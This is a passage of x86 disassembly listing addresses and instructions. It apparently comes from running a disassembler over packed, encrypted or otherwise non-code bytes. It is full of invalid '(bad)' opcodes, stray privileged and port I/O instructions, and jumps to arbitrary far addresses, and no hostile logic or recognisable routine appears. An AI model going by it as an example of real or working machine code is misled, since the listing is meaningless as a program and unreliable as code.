  41a10f:	lds    ebx,FWORD PTR [esi]
  41a111:	lahf   
  41a112:	and    DWORD PTR [esi+0x2d45194c],edx
  41a118:	sbb    ebp,0x2e011bb7
  41a11e:	sti    
  41a11f:	(bad)  
  41a120:	adc    al,0xf
  41a122:	sub    DWORD PTR [eax+ebp*1],ebx
  41a125:	push   ds
  41a126:	jmp    0x31bc486d
  41a12b:	push   cs
  41a12c:	iret   
  41a12d:	inc    edi
  41a12e:	mov    bh,0x34
  41a130:	cmp    ah,BYTE PTR [bp+di-0x5e42]
  41a135:	sub    al,0x9d
  41a137:	(bad)  
  41a138:	mov    ebp,0x2c90d91f
  41a13d:	icebp  
  41a13e:	xlat   BYTE PTR ds:[ebx]
  41a13f:	xchg   ebp,eax
  41a140:	sbb    ah,ch
  41a142:	sbb    dh,BYTE PTR ds:0xec70a2b8
  41a148:	push   ebp
  41a149:	pop    edx
  41a14a:	pop    esi
  41a14b:	sbb    esp,edx
  41a14d:	adc    eax,0x95e96711
  41a152:	aam    0x49
  41a154:	inc    eax
  41a155:	out    0x4,eax
  41a157:	adc    al,0x4d
  41a159:	cmp    eax,0xe13f5593
  41a15e:	popa   
  41a15f:	adc    al,BYTE PTR [esi]
  41a161:	js     0x41a121
  41a163:	adc    DWORD PTR [ecx],ebx
  41a165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a166:	loopne 0x41a1a1
  41a168:	out    dx,al
  41a169:	adc    ebp,DWORD PTR [ebx]
  41a16b:	jno    0x41a19e
  41a16d:	sbb    eax,0x3ff9e054
  41a172:	adc    bh,BYTE PTR [ecx-0x1a]
  41a175:	ss inc ecx
  41a177:	xchg   ebx,eax
  41a178:	test   eax,0x1a2df518
  41a17d:	js     0x41a154
  41a17f:	out    0x5b,al
  41a181:	xchg   esp,eax
  41a182:	(bad)  
  41a183:	icebp  
  41a184:	jnp    0x41a1f6
  41a186:	sahf   
  41a187:	xor    al,dh
  41a189:	shr    al,cl
  41a18b:	jl     0x41a19b
  41a18d:	xchg   DWORD PTR [ebp-0x5f],ebp
  41a190:	jmp    0x3259:0x84e75d39
  41a197:	leave  
  41a198:	in     eax,0x5
  41a19a:	popa   
  41a19b:	mov    eax,0x70e8b497
  41a1a0:	push   ds
  41a1a1:	add    al,0xaf
  41a1a3:	addr16 inc esp
  41a1a5:	sub    al,0x83
  41a1a7:	adc    al,0x35
  41a1a9:	daa    
  41a1aa:	stos   DWORD PTR es:[edi],eax
  41a1ab:	cmp    eax,0xdd14a1bb
  41a1b0:	(bad)  
  41a1b1:	das    
  41a1b2:	in     eax,dx
  41a1b3:	pop    ebp
  41a1b4:	xchg   ecx,eax
  41a1b5:	sbb    dl,BYTE PTR [edx-0xf]
  41a1b8:	and    eax,0xd6d80f4f
  41a1bd:	(bad)  
  41a1be:	cld    
  41a1bf:	mov    ds:0xfb507959,eax
  41a1c4:	jb     0x41a154
  41a1c6:	or     al,0xd6
  41a1c8:	cmp    DWORD PTR [edi+0x9],0x66062c0b
  41a1cf:	adc    ecx,esp
  41a1d1:	popf   
  41a1d2:	dec    ebx
  41a1d3:	mov    bl,BYTE PTR [edx+0x173f41d]
  41a1d9:	ins    DWORD PTR es:[edi],dx
  41a1da:	nop
  41a1db:	cmp    BYTE PTR [edi-0x7c],al
  41a1de:	cwde   
  41a1df:	ror    dh,1
  41a1e1:	ffreep st(6)
  41a1e3:	adc    ecx,DWORD PTR [ebx-0x2b61c120]
  41a1e9:	aas    
  41a1ea:	out    dx,eax
  41a1eb:	pop    esp
  41a1ec:	rcr    DWORD PTR [eax+eiz*2-0x6ccacb57],0x8c
  41a1f4:	(bad)  
  41a1f5:	(bad)  
  41a1f6:	sub    eax,0x285795e5
  41a1fb:	jle    0x41a243
  41a1fd:	leave  
  41a1fe:	xchg   ebp,eax
  41a1ff:	push   0x96d8cd5e
  41a204:	gs sti 
  41a206:	sub    DWORD PTR [eax-0x3e],edx
  41a209:	xchg   ebx,eax
  41a20a:	les    eax,FWORD PTR [ebp-0x7d]
  41a20d:	fsub   st(5),st
  41a20f:	cwde   
  41a210:	mul    BYTE PTR [eax+0x43]
  41a213:	inc    edx
  41a214:	repz fsubr QWORD PTR [eax-0x2b58cc2f]
  41a21b:	shl    BYTE PTR [eax-0x7c314b64],1
  41a221:	xchg   edx,eax
  41a222:	lock scas eax,DWORD PTR es:[edi]
  41a224:	pusha  
  41a225:	dec    esi
  41a226:	add    eax,0x35230f38
  41a22b:	shl    BYTE PTR [ecx+0x6db0267],0x95
  41a232:	dec    ecx
  41a233:	xor    ecx,DWORD PTR [ecx]
  41a235:	push   ecx
  41a236:	inc    ebp
  41a237:	jecxz  0x41a265
  41a239:	shl    DWORD PTR [ecx],cl
  41a23b:	shl    DWORD PTR [ebx-0x732145c8],0x6
  41a242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a243:	xor    DWORD PTR [ebx+0x68],0xdd7166c0
  41a24a:	pop    esi
  41a24b:	aad    0x41
  41a24d:	adc    ah,BYTE PTR [edi+eiz*2]
  41a250:	jno    0x41a22d
  41a252:	(bad)  
  41a253:	cld    
  41a254:	inc    edx
  41a255:	xlat   BYTE PTR ds:[ebx]
  41a256:	jecxz  0x41a241
  41a258:	and    DWORD PTR [ebp-0x36],esi
  41a25b:	das    
  41a25c:	inc    ebx
  41a25d:	push   ebp
  41a25e:	mov    al,0xf
  41a260:	int3   
  41a261:	cld    
  41a262:	je     0x41a2b8
  41a264:	cmp    BYTE PTR [edi+0x453a0697],ah
  41a26a:	fist   WORD PTR [eax-0x24]
  41a26d:	ins    BYTE PTR es:[edi],dx
  41a26e:	mov    al,ds:0x77992cdc
  41a273:	sbb    esp,DWORD PTR [ecx+0x8]
  41a276:	add    al,0xd4
  41a278:	add    ch,ah
  41a27a:	(bad)  
  41a27b:	ss push edi
  41a27d:	inc    esi
  41a27e:	pop    ecx
  41a27f:	cmc    
  41a280:	(bad)  
  41a282:	cs mov edx,0x78f5866d
  41a288:	scas   eax,DWORD PTR es:[edi]
  41a289:	daa    
  41a28a:	add    al,0x69
  41a28c:	mov    eax,ds:0x3451494b
  41a291:	xor    edx,DWORD PTR [eax-0xf]
  41a294:	mov    ?,WORD PTR [ebp+0xa445128]
  41a29a:	into   
  41a29b:	aaa    
  41a29c:	call   0x2334a628
  41a2a1:	fnstenv [ebx]
  41a2a3:	push   ecx
  41a2a4:	mov    ebx,ebp
  41a2a6:	inc    ebx
  41a2a7:	fdivr  DWORD PTR [esi+0x74]
  41a2aa:	jb     0x41a256
  41a2ac:	sub    al,BYTE PTR [ebp-0x5e3e33ec]
  41a2b2:	adc    BYTE PTR [edx],cl
  41a2b4:	push   0x947a555b
  41a2b9:	and    bh,cl
  41a2bb:	(bad)  
  41a2bc:	dec    ecx
  41a2bd:	retf   
  41a2be:	imul   ecx,DWORD PTR [edi],0xffffff84
  41a2c1:	xchg   esp,eax
  41a2c2:	out    dx,al
  41a2c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2c4:	push   eax
  41a2c5:	ret    
  41a2c6:	scas   eax,DWORD PTR es:[edi]
  41a2c7:	pop    DWORD PTR [eax]
  41a2c9:	das    
  41a2ca:	pop    ebx
  41a2cb:	(bad)  
  41a2cc:	push   eax
  41a2cd:	test   al,0x41
  41a2cf:	sbb    ecx,DWORD PTR [edi]
  41a2d1:	push   esi
  41a2d2:	js     0x41a2dc
  41a2d4:	shl    DWORD PTR [esi],1
  41a2d6:	pop    ecx
  41a2d7:	adc    BYTE PTR [ebx],ch
  41a2d9:	or     bh,BYTE PTR [eax-0x24]
  41a2dc:	xor    ah,BYTE PTR [edi+0x5af34369]
  41a2e2:	pop    ecx
  41a2e3:	push   edx
  41a2e4:	sbb    ecx,ebx
  41a2e6:	mov    DWORD PTR ds:0x68ea146f,0xc35c2e55
  41a2f0:	adc    DWORD PTR [edi-0x6e],0x38230bcc
  41a2f7:	in     eax,0xe1
  41a2f9:	or     eax,DWORD PTR [edi]
  41a2fb:	xchg   ebp,eax
  41a2fc:	imul   edi,DWORD PTR [edi+eiz*2],0x1a
  41a300:	xchg   esi,eax
  41a301:	mov    ebx,0x63dd6990
  41a306:	icebp  
  41a307:	pop    esp
  41a308:	mov    eax,ds:0xb2f1701a
  41a30d:	lock hlt 
  41a30f:	fild   QWORD PTR [esi]
  41a311:	ja     0x41a308
  41a313:	xchg   ebp,eax
  41a314:	cmp    esp,DWORD PTR [esi+0x4c]
  41a317:	xor    DWORD PTR [edi],ebp
  41a319:	cwde   
  41a31a:	dec    edi
  41a31b:	mov    eax,0xcbf39ab9
  41a320:	mov    fs,WORD PTR [ebp+0x522fa60e]
  41a326:	sbb    bl,BYTE PTR [esi+0x2871fa1f]
  41a32c:	ins    DWORD PTR es:[edi],dx
  41a32d:	jecxz  0x41a33b
  41a32f:	push   edx
  41a330:	pop    ebx
  41a331:	xor    al,0x49
  41a333:	addr16 dec ebp
  41a335:	pop    ss
  41a336:	mov    eax,0x1260a163
  41a33b:	jnp    0x41a316
  41a33d:	leave  
  41a33e:	mov    cl,BYTE PTR [eax]
  41a340:	mov    ah,0xcf
  41a342:	mov    es,ebx
  41a344:	pop    ds
  41a345:	cmp    eax,0x6b634686
  41a34a:	sar    DWORD PTR [edi+0x66467037],0x4d
  41a351:	pop    ebp
  41a352:	jecxz  0x41a31e
  41a354:	test   al,0xea
  41a356:	dec    esp
  41a357:	jo     0x41a354
  41a359:	xchg   edi,eax
  41a35a:	pop    ecx
  41a35b:	pop    edx
  41a35c:	sbb    dh,al
  41a35e:	pushf  
  41a35f:	ds add eax,0x690900f3
  41a365:	xchg   ecx,eax
  41a366:	mov    al,0x3
  41a368:	and    DWORD PTR ds:0xa99dfe9b,ebx
  41a36e:	fwait
  41a36f:	sub    edi,ecx
  41a371:	dec    edi
  41a372:	push   esi
  41a373:	and    esp,eax
  41a375:	push   cs
  41a376:	imul   edx,DWORD PTR [edx],0x2cb9a49
  41a37c:	retf   
  41a37d:	ds cli 
  41a37f:	xlat   BYTE PTR ds:[ebx]
  41a380:	xor    BYTE PTR [eax],0xd2
  41a383:	mov    ebx,0x243a6477
  41a388:	inc    ebx
  41a389:	cmp    bl,bh
  41a38b:	inc    esp
  41a38c:	sub    al,0xf3
  41a38e:	xor    bh,bl
  41a390:	ror    DWORD PTR [esi-0x5d994a42],0x53
  41a397:	add    BYTE PTR [eax],bh
  41a399:	loope  0x41a381
  41a39b:	pop    edi
  41a39c:	int    0xc8
  41a39e:	das    
  41a39f:	xor    BYTE PTR [edi+0x73553982],ah
  41a3a5:	mov    ebp,0x8dab7538
  41a3aa:	into   
  41a3ab:	mov    ch,0x36
  41a3ad:	inc    ecx
  41a3ae:	xor    ch,al
  41a3b0:	sbb    DWORD PTR [eax-0x2f2379ee],edx
  41a3b6:	or     dh,BYTE PTR [ecx]
  41a3b8:	push   esp
  41a3b9:	push   ds
  41a3ba:	dec    edi
  41a3bb:	xor    eax,0xab5d4779
  41a3c0:	fstp   TBYTE PTR [ebp+0x45]
  41a3c3:	popf   
  41a3c4:	pop    es
  41a3c5:	or     eax,0x749ae335
  41a3ca:	mov    esp,0x415b3039
  41a3cf:	xor    BYTE PTR [ebp-0x7f],cl
  41a3d2:	imul   edx,DWORD PTR [ebx],0xffffff9f
  41a3d5:	(bad)  
  41a3d6:	pop    esp
  41a3d7:	inc    edi
  41a3d8:	std    
  41a3d9:	or     eax,0x564e6b86
  41a3de:	jmp    0x41a3c6
  41a3e0:	int3   
  41a3e1:	jmp    0x41a3e9
  41a3e3:	add    ch,BYTE PTR [eax+0x41c7851b]
  41a3e9:	(bad)  
  41a3ea:	in     al,0xe7
  41a3ec:	scas   al,BYTE PTR es:[edi]
  41a3ed:	cwde   
  41a3ee:	shl    BYTE PTR [edx+0x68588d11],1
  41a3f4:	xchg   esi,eax
  41a3f5:	dec    ebx
  41a3f6:	sub    DWORD PTR ds:0x27a65024,esp
  41a3fc:	add    DWORD PTR [ebx],ecx
  41a3fe:	or     eax,0x53d25d20
  41a403:	inc    edi
  41a404:	pop    edi
  41a405:	jecxz  0x41a414
  41a407:	push   edi
  41a408:	out    dx,al
  41a409:	adc    eax,DWORD PTR [ecx]
  41a40b:	jecxz  0x41a39b
  41a40d:	cmp    BYTE PTR [edi+edx*2+0x6a],dl
  41a411:	(bad)  [edi]
  41a413:	iret   
  41a414:	into   
  41a415:	inc    ebx
  41a416:	push   ecx
  41a417:	cmp    ebx,DWORD PTR [ecx-0x66]
  41a41a:	jo     0x41a3dc
  41a41c:	psrlw  mm6,QWORD PTR [esi+0xa]
  41a420:	mov    esp,0xb7555013
  41a425:	or     ch,cl
  41a427:	out    0xd3,eax
  41a429:	push   ebx
  41a42a:	pop    ecx
  41a42b:	xor    edi,esi
  41a42d:	add    DWORD PTR [ebp-0x44],ebx
  41a430:	enter  0x814b,0xaf
  41a434:	pop    ds
  41a435:	fisttp QWORD PTR [edx+0x52f8d1be]
  41a43b:	add    eax,0xb660742d
  41a440:	jmp    FWORD PTR [eax-0x270b12ab]
  41a446:	into   
  41a447:	dec    edx
  41a448:	pop    edx
  41a449:	pop    ss
  41a44a:	gs ss xchg esi,eax
  41a44d:	push   esp
  41a44e:	pop    esp
  41a44f:	pop    ecx
  41a450:	sbb    ch,dh
  41a452:	adc    eax,0x9718ea20
  41a457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a458:	mov    dl,0x8e
  41a45a:	xor    edi,DWORD PTR [ebp+edx*1-0x50]
  41a45e:	dec    ebx
  41a45f:	pop    ss
  41a460:	leave  
  41a461:	iret   
  41a462:	test   eax,0x3aa127e
  41a467:	in     al,dx
  41a468:	jle    0x41a405
  41a46a:	xchg   ecx,eax
  41a46b:	inc    ebp
  41a46c:	data16 adc al,0x53
  41a46f:	cdq    
  41a470:	jno    0x41a407
  41a472:	and    al,0x63
  41a474:	fisub  DWORD PTR ds:0xd14c19fe
  41a47a:	jnp    0x41a459
  41a47c:	inc    ebx
  41a47d:	icebp  
  41a47e:	sub    DWORD PTR [edi+0x6f4c443d],eax
  41a484:	lahf   
  41a485:	pop    ebp
  41a486:	and    eax,0x536864cc
  41a48b:	addr16 push eax
  41a48d:	mov    dl,0x47
  41a48f:	lock bound esp,QWORD PTR ds:0x42d44e44
  41a496:	(bad)  
  41a497:	cli    
  41a498:	ins    BYTE PTR es:[edi],dx
  41a499:	in     al,dx
  41a49a:	inc    ebp
  41a49b:	cmc    
  41a49c:	sahf   
  41a49d:	jmp    0x41a4ec
  41a49f:	mov    dh,0xfc
  41a4a1:	sub    al,0x20
  41a4a3:	mov    esi,0x7615daa6
  41a4a8:	xchg   esi,eax
  41a4a9:	test   eax,0x5cb15b9
  41a4ae:	fs xor bl,cl
  41a4b1:	push   0x4e8a23fb
  41a4b6:	cld    
  41a4b7:	pop    eax
  41a4b8:	jnp    0x41a459
  41a4ba:	nop
  41a4bb:	nop
  41a4bc:	test   dl,0xce
  41a4bf:	jnp    0x41a532
  41a4c1:	or     eax,0xb8001674
  41a4c6:	mov    ds:0xda629ccf,al
  41a4cb:	inc    edx
  41a4cc:	je     0x41a478
  41a4ce:	xor    cl,cl
  41a4d0:	jmp    0xf1b3:0x3f3c49fb
  41a4d7:	and    BYTE PTR [ebx+edx*1],bl
  41a4da:	xchg   edx,eax
  41a4db:	fidivr WORD PTR [edi-0x17]
  41a4de:	inc    ecx
  41a4df:	rcl    edi,cl
  41a4e1:	je     0x41a543
  41a4e3:	in     al,0x35
  41a4e5:	(bad)  
  41a4e6:	and    eax,0x17763adf
  41a4eb:	std    
  41a4ec:	jmp    0xcf566b69
  41a4f1:	cmp    eax,0xda8b81a5
  41a4f6:	ret    0xa256
  41a4f9:	js     0x41a47f
  41a4fb:	retf   
  41a4fc:	out    0x45,eax
  41a4fe:	(bad)  
  41a4ff:	adc    BYTE PTR [ebx+0x6f],cl
  41a502:	jecxz  0x41a4aa
  41a504:	cmp    esi,DWORD PTR [edi+0x4b]
  41a507:	adc    BYTE PTR [ebp+ebp*8+0x19dd7281],dl
  41a50e:	mov    eax,ds:0xcaad2e83
  41a513:	mov    ebp,DWORD PTR [esi+0x3434f9ee]
  41a519:	jno    0x41a4b6
  41a51b:	pop    es
  41a51c:	and    BYTE PTR [ebp-0x2d],0x35
  41a520:	push   0x5c
  41a522:	stos   DWORD PTR es:[edi],eax
  41a523:	bound  esp,QWORD PTR [eax]
  41a525:	mov    ds:0x9293ee9f,al
  41a52a:	sar    DWORD PTR [ebx+0x2c1b02a1],0x44
  41a531:	jmp    0x7b36b499
  41a536:	xor    al,0x10
  41a538:	cdq    
  41a539:	jmp    0x41a5ac
  41a53b:	lods   al,BYTE PTR ds:[esi]
  41a53c:	or     bh,BYTE PTR [eax+eiz*2]
  41a53f:	jno    0x41a4fb
  41a541:	in     al,dx
  41a542:	scas   al,BYTE PTR es:[edi]
  41a543:	mov    esp,0xaa39ff6
  41a548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a549:	cli    
  41a54a:	das    
  41a54b:	(bad)  
  41a54c:	aas    
  41a54d:	out    0xbd,eax
  41a54f:	or     esp,DWORD PTR [ebp+edi*2-0x77fad155]
  41a556:	loopne 0x41a4f9
  41a558:	retf   0x4cb1
  41a55b:	jle    0x41a5c9
  41a55d:	in     eax,0xd3
  41a55f:	mov    bh,BYTE PTR [esp+eiz*8]
  41a562:	jl     0x41a58d
  41a564:	loopne 0x41a50e
  41a566:	jmp    0x6478:0xc5a2356b
  41a56d:	or     bh,BYTE PTR [edi]
  41a56f:	sub    ebx,edi
  41a571:	test   al,0xc9
  41a573:	mov    bl,BYTE PTR [ecx-0x4b9cf72c]
  41a579:	push   esp
  41a57a:	jnp    0x41a52f
  41a57c:	enter  0x7b9d,0xb2
  41a580:	frstor [esi+ecx*8-0x5e]
  41a584:	cdq    
  41a585:	daa    
  41a586:	xchg   ecx,eax
  41a587:	(bad)  
  41a588:	(bad)  
  41a589:	fsubp  st(3),st
  41a58b:	dec    esi
  41a58c:	lds    ebx,FWORD PTR [ecx+esi*1]
  41a58f:	lahf   
  41a590:	xor    ecx,edx
  41a592:	dec    edi
  41a593:	aas    
  41a594:	jl     0x41a595
  41a596:	leave  
  41a597:	into   
  41a598:	daa    
  41a599:	and    BYTE PTR [ebp+0x1da6dcc8],bh
  41a59f:	pop    ebx
  41a5a0:	fisttp QWORD PTR ds:0x3089ff15
  41a5a6:	sub    eax,0x27a041aa
  41a5ab:	es cs jl 0x41a550
  41a5af:	stos   BYTE PTR es:[edi],al
  41a5b0:	pop    ecx
  41a5b1:	fimul  WORD PTR [esi+0x20a0787a]
  41a5b7:	cmc    
  41a5b8:	inc    ecx
  41a5b9:	dec    edi
  41a5ba:	outs   dx,BYTE PTR ds:[esi]
  41a5bb:	(bad)  
  41a5bc:	jno    0x41a5f6
  41a5be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5bf:	(bad)  [ebx+0x47d4bb7c]
  41a5c5:	ror    DWORD PTR fs:[ecx+ecx*1+0x75d94ced],1
  41a5cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5ce:	dec    ecx
  41a5cf:	lea    esi,[eax]
  41a5d1:	push   ebx
  41a5d2:	xchg   esp,esi
  41a5d4:	xchg   ebx,eax
  41a5d5:	imul   ebx,DWORD PTR [ecx+ecx*8-0x93787d],0x1491d978
  41a5e0:	push   ss
  41a5e1:	sbb    al,0x36
  41a5e3:	mov    edx,0x6d3581d8
  41a5e8:	fsub   QWORD PTR [ecx+0x7]
  41a5eb:	ins    BYTE PTR es:[edi],dx
  41a5ec:	jp     0x41a601
  41a5ee:	cmp    eax,edx
  41a5f0:	mov    edx,0x34d24d1e
  41a5f5:	mov    cl,0x42
  41a5f7:	add    al,ch
  41a5f9:	jl     0x41a646
  41a5fb:	in     al,0x2e
  41a5fd:	(bad)  
  41a5fe:	in     al,0xa1
  41a600:	adc    DWORD PTR [esi],0x5
  41a603:	push   edi
  41a604:	sub    eax,0xd9098d85
  41a609:	pop    eax
  41a60a:	lods   al,BYTE PTR ds:[esi]
  41a60b:	jmp    0x8ae2:0xd78ecfb3
  41a612:	sbb    DWORD PTR [ecx-0x76],esp
  41a615:	fs sbb esi,ecx
  41a618:	cs cmc 
  41a61a:	mov    esi,0x380c7d3
  41a61f:	lods   eax,DWORD PTR ds:[esi]
  41a620:	xor    BYTE PTR [ebx+ebx*8-0x59b990f9],dl
  41a627:	or     BYTE PTR [eax-0x7ae5f468],0x4c
  41a62e:	cmp    DWORD PTR [edi+0x27],esp
  41a631:	iret   
  41a632:	dec    edx
  41a633:	xor    dl,BYTE PTR [ebp-0x39]
  41a636:	iret   
  41a637:	ins    BYTE PTR es:[edi],dx
  41a638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a639:	jnp    0x41a5dc
  41a63b:	imul   edi,DWORD PTR [ebx+esi*8],0x5a
  41a63f:	mov    esp,0x143afaa9
  41a644:	cld    
  41a645:	(bad)  
  41a646:	clc    
  41a647:	adc    ebx,DWORD PTR [eax+0x137e820c]
  41a64d:	pusha  
  41a64e:	sub    dh,BYTE PTR [edx]
  41a650:	cmp    BYTE PTR [edx],bl
  41a652:	popa   
  41a653:	cmp    BYTE PTR [edx-0x688a171b],dl
  41a659:	jno    0x41a644
  41a65b:	adc    al,0x21
  41a65d:	je     0x41a5f7
  41a65f:	ficom  WORD PTR [eax-0x62]
  41a662:	stc    
  41a663:	(bad)  [ebp+esi*2+0x5f]
  41a667:	push   0x148ce668
  41a66c:	adc    eax,0xb0b09c
  41a671:	or     eax,0xc744fe34
  41a676:	fnstcw WORD PTR [eax+eiz*2+0x106e763a]
  41a67d:	sub    cl,BYTE PTR [eax-0x67]
  41a680:	gs cmc 
  41a682:	mov    WORD PTR [ebx],?
  41a684:	inc    eax
  41a685:	and    al,0x1a
  41a687:	jmp    0x41a694
  41a689:	loopne 0x41a669
  41a68b:	cwde   
  41a68c:	int3   
  41a68d:	or     DWORD PTR [ecx+eax*1-0x33],ebx
  41a691:	ja     0x41a6f0
  41a693:	mov    WORD PTR [edx],es
  41a695:	or     DWORD PTR [eax-0x5ed99511],eax
  41a69b:	xlat   BYTE PTR ds:[ebx]
  41a69c:	pop    esp
  41a69d:	retf   
  41a69e:	sbb    DWORD PTR [edi+0x72700627],edx
  41a6a4:	(bad)  
  41a6a5:	out    dx,al
  41a6a6:	test   DWORD PTR [edx+0x78],ebx
  41a6a9:	cmp    DWORD PTR [ebx-0x69b26642],eax
  41a6af:	(bad)  
  41a6b1:	shr    DWORD PTR [ebx],0xe
  41a6b4:	mov    esp,0xfdd7a782
  41a6b9:	dec    edx
  41a6ba:	dec    ecx
  41a6bb:	cmp    al,0x42
  41a6bd:	into   
  41a6be:	mov    esp,0xc5f631c5
  41a6c3:	ja     0x41a6da
  41a6c5:	data16 fist WORD PTR [ebx+ecx*8+0x1f3366e9]
  41a6cd:	nop
  41a6ce:	pop    ecx
  41a6cf:	cs inc edi
  41a6d1:	add    ebx,DWORD PTR [esi+ebx*8-0x4ffc413b]
  41a6d8:	mov    DWORD PTR [eax],edx
  41a6da:	es mov eax,0x5a87df2
  41a6e0:	ret    
  41a6e1:	pusha  
  41a6e2:	inc    esi
  41a6e3:	ja     0x41a6c3
  41a6e5:	and    eax,0xe053ff3d
  41a6ea:	inc    edx
  41a6eb:	or     ebx,ebp
  41a6ed:	or     al,0x92
  41a6ef:	xchg   ebx,eax
  41a6f0:	test   bh,dl
  41a6f2:	out    dx,eax
  41a6f3:	fwait
  41a6f4:	pop    ebx
  41a6f5:	push   esp
  41a6f6:	je     0x41a6bc
  41a6f8:	xchg   DWORD PTR [ebx-0x29],ebx
  41a6fb:	xlat   BYTE PTR ds:[ebx]
  41a6fc:	clc    
  41a6fd:	mov    cl,0x1d
  41a6ff:	mov    ds:0xdafbc01f,eax
  41a704:	push   edi
  41a705:	nop
  41a706:	sub    eax,0x25140783
  41a70b:	mov    esi,0x33b8d465
  41a710:	cwde   
  41a711:	jb     0x41a78e
  41a713:	lods   eax,DWORD PTR ds:[esi]
  41a714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a715:	xchg   esi,eax
  41a716:	cmp    bl,dl
  41a718:	addr16 mov eax,ds:0xe792
  41a71c:	xlat   BYTE PTR ds:[ebx]
  41a71d:	ret    0xbea7
  41a720:	mov    dl,dl
  41a722:	jne    0x41a721
  41a724:	das    
  41a725:	adc    DWORD PTR [edx+0x24edb98e],0xdebb9
  41a72f:	(bad)  
  41a730:	aad    0x74
  41a732:	xchg   edi,eax
  41a733:	adc    DWORD PTR [ecx+0x37606c43],esp
  41a739:	bound  ebx,QWORD PTR ds:0xbed91f05
  41a73f:	inc    esp
  41a740:	xor    BYTE PTR [ecx+0x24eb9e49],0x28
  41a747:	push   cs
  41a748:	xor    ecx,DWORD PTR [ebx-0x1b]
  41a74b:	jp     0x41a70f
  41a74d:	cli    
  41a74e:	int    0x0
  41a750:	jne    0x41a706
  41a752:	rcl    BYTE PTR [edx],0x2c
  41a755:	or     esp,esi
  41a757:	dec    ebx
  41a758:	adc    ecx,0x3369c646
  41a75e:	xor    al,0xa4
  41a760:	cld    
  41a761:	sahf   
  41a762:	cmp    eax,0x48a393e0
  41a767:	xor    esp,esi
  41a769:	repnz push edx
  41a76b:	loopne 0x41a783
  41a76d:	andps  xmm3,XMMWORD PTR [edx-0x6d]
  41a771:	xor    BYTE PTR [esi-0x75],cl
  41a774:	jg     0x41a734
  41a776:	cwde   
  41a777:	xor    cl,BYTE PTR [edx]
  41a779:	in     al,0xad
  41a77b:	and    DWORD PTR [edx],eax
  41a77d:	out    dx,al
  41a77e:	sbb    dl,BYTE PTR [edi-0x30]
  41a781:	push   es
  41a782:	js     0x41a776
  41a784:	jmp    0x41a78a
  41a786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a787:	cmp    cl,BYTE PTR [ecx+0x10]
  41a78a:	adc    eax,0xd2109a3f
  41a78f:	jge    0x41a807
  41a791:	jl     0x41a7d8
  41a793:	add    al,0x24
  41a795:	lds    edx,FWORD PTR [eax+ebx*4+0x7]
  41a799:	push   ecx
  41a79a:	jl     0x41a778
  41a79c:	out    0x63,eax
  41a79e:	xor    cl,BYTE PTR [esi-0x61]
  41a7a1:	scas   al,BYTE PTR es:[edi]
  41a7a2:	mov    BYTE PTR [edi+0x4],0x6f
  41a7a6:	jns    0x41a820
  41a7a8:	outs   dx,BYTE PTR ds:[esi]
  41a7a9:	push   edi
  41a7aa:	or     al,0x3
  41a7ac:	adc    dl,0x62
  41a7af:	xor    edx,DWORD PTR [esi-0x2f2e5f91]
  41a7b5:	ds (bad) 
  41a7b7:	fidivr DWORD PTR [esi+ebp*1+0x32]
  41a7bb:	out    dx,eax
  41a7bc:	mov    ch,0xd3
  41a7be:	mov    esp,DWORD PTR [ebp-0x1e]
  41a7c1:	lds    edx,FWORD PTR [esi-0x22]
  41a7c4:	bound  esi,QWORD PTR [ecx]
  41a7c6:	arpl   WORD PTR [eax],di
  41a7c8:	sub    BYTE PTR [ebp-0x2ecd64de],cl
  41a7ce:	scas   al,BYTE PTR es:[edi]
  41a7cf:	and    eax,0x739c5264
  41a7d4:	stos   DWORD PTR es:[edi],eax
  41a7d5:	or     dh,BYTE PTR [esi+0x23]
  41a7d8:	cld    
  41a7d9:	scas   al,BYTE PTR es:[edi]
  41a7da:	out    0xe0,al
  41a7dc:	int3   
  41a7dd:	movntps XMMWORD PTR [esi-0x2a],xmm1
  41a7e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7e2:	repz (bad) [ebp+0x7d]
  41a7e6:	jmp    0x9c783baf
  41a7eb:	push   ebx
  41a7ec:	fadd   QWORD PTR [edx+ecx*1+0x38]
  41a7f0:	fnstenv [ecx-0x1e]
  41a7f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7f4:	xchg   esi,eax
  41a7f5:	sub    BYTE PTR [ecx],0x7a
  41a7f8:	call   0xc1da:0xcf3fd427
  41a7ff:	cmp    esp,DWORD PTR [edx]
  41a801:	push   eax
  41a802:	xor    esp,esi
  41a804:	push   eax
  41a805:	out    0x8a,eax
  41a807:	and    eax,0xff64ddee
  41a80c:	lahf   
  41a80d:	leave  
  41a80e:	sub    eax,0x5cc9ad0d
  41a813:	mov    BYTE PTR [edx],dl
  41a815:	dec    edi
  41a816:	jns    0x41a7c0
  41a818:	je     0x41a820
  41a81a:	cmp    al,0xce
  41a81c:	xor    al,dh
  41a81e:	fldcw  WORD PTR [esi]
  41a820:	xor    ecx,DWORD PTR [ebp+0x5f2b0ba]
  41a826:	cdq    
  41a827:	shl    cl,0x8d
  41a82a:	into   
  41a82b:	mov    ds:0x4b61fe88,eax
  41a830:	out    dx,eax
  41a831:	mov    ds:0xa6b0c888,eax
  41a836:	pop    esp
  41a837:	mov    DWORD PTR [edx-0x12],ebp
  41a83a:	push   esp
  41a83b:	lahf   
  41a83c:	pop    edi
  41a83d:	adc    DWORD PTR [ebp-0x8],edi
  41a840:	add    esp,esp
  41a842:	xor    esp,ebx
  41a844:	ret    0x6005
  41a847:	pushf  
  41a848:	repnz adc al,0xed
  41a84b:	and    DWORD PTR ds:0xf24a0bef,0xf2873fe6
  41a855:	retf   
  41a856:	pusha  
  41a857:	or     esi,DWORD PTR [edx+0x1]
  41a85a:	fcomip st,st(3)
  41a85c:	aaa    
  41a85d:	mov    BYTE PTR ds:0x5f419dcc,0x5
  41a864:	scas   al,BYTE PTR es:[edi]
  41a865:	enter  0xdbb5,0xed
  41a869:	aam    0x57
  41a86b:	inc    ecx
  41a86c:	fcom   QWORD PTR cs:[edi]
